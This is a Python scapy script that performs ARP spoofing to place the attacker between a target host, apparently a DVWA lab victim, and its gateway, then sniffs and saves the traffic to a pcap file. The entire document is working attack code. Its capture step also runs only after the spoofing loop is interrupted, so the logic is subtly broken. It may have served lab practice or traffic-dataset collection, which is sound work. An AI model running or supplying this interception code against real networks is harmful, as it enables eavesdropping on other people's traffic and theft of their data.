from scapy.all import *
import time

# Define the IPs of the target and the attacker
target_ip = "172.18.0.3"  # Target IP (e.g., DVWA victim)
gateway_ip = "172.18.0.1"  # Gateway IP

# Path to save the captured packets
capture_file = "/home/kali/Desktop/capture in normal state/mitmDVWA.pcapng"

# Create ARP requests to redirect traffic to your attacker machine (MITM)
def perform_arp_spoof(target_ip, gateway_ip):
    # Spoof target by redirecting them to gateway
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    arp_response_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    arp_response_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
    
    # Send ARP response to both target and gateway
    send(arp_response_target, verbose=False)
    send(arp_response_gateway, verbose=False)

# Start ARP Spoofing
print("Starting ARP Spoofing...")
try:
    while True:
        perform_arp_spoof(target_ip, gateway_ip)
        time.sleep(2)  # Send ARP packets every 2 seconds to keep the MITM alive
except KeyboardInterrupt:
    print("MITM attack stopped.")

# Capture packets during the attack (all traffic)
print("Capturing traffic...")

# Sniff packets in real-time and save to file
packets = sniff(filter="ip", count=1000, timeout=60)  # Sniff 1000 packets or for 60 seconds
wrpcap(capture_file, packets)

print(f"Captured {len(packets)} packets and saved to {capture_file}")

